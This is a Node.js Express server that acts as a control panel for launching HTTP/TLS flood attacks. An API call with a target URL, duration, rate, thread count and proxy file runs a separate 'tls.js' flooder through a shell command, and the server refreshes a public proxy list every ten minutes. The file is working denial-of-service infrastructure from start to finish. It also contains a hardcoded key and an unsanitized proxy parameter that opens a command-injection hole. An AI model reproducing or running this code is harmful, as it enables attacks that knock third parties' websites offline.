const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');

const urlRegex = /^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/;
const blackList = ['\'', '"', '[', ']', '{', '}', '(', ')', ';', '|', '&', '%', '#', '@'];

const api_port = 4000; // API port
const api_key = "quangdev"; // Your API key

const app = express();
app.use(express.json());

// Validate URL
const isValidUrl = (url) => urlRegex.test(url) && !blackList.some(char => url.includes(char));

// Validate number and range
const isValidNumber = (value, max = Infinity) => !isNaN(value) && value >= 0 && value <= max;

app.get(`/api`, async (req, res) => {
    const { url, time, rate, thea, proxy, api_key: apiKey } = req.query;

    // Validate API key
    if (apiKey !== api_key) {
        return res.json({ status: 500, data: `Invalid API key` });
    }

    // Validate parameters
    if (!url || !isValidUrl(url)) return res.json({ status: 500, data: `Invalid URL` });
    if (!isValidNumber(time, 86400)) return res.json({ status: 500, data: `Time must be a number between 0 and 86400` });
    if (!isValidNumber(rate)) return res.json({ status: 500, data: `Invalid rate` });
    if (!isValidNumber(thea)) return res.json({ status: 500, data: `Invalid thread count` });
    if (!proxy) return res.json({ status: 500, data: `Proxy file cannot be empty` });

    console.log(`URL: ${url}, Time: ${time}, Rate: ${rate}, Threads: ${thea}. Attack starting.`);

    // Command to execute tls-rapid.js
    const command = `node tls.js ${url} ${time} ${rate} ${thea} ${proxy}`;

    // Respond immediately
    res.json({
        status: 200,
        message: 'Attack started successfully!',
        data: { url, time, rate, thea, proxy }
    });

    // Execute the command
    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing command: ${stderr}`);
            return;
        }
        console.log(`Command output: ${stdout}`);
    });
});

// Download proxy list
async function downloadProxy() {
    const proxyUrl = "https://sunny9577.github.io/proxy-scraper/proxies.txt";
    try {
        const response = await axios.get(proxyUrl);
        fs.writeFileSync('proxies.txt', response.data);
        console.log(`Proxy list saved to proxies.txt`);
    } catch (error) {
        console.error(`Error downloading proxy list: ${error.message}`);
    }
}

// Schedule proxy downloads every 10 minutes
setInterval(downloadProxy, 600000);

// Initial proxy download
downloadProxy();

app.listen(api_port, () => console.log(`API running on port ${api_port}`));
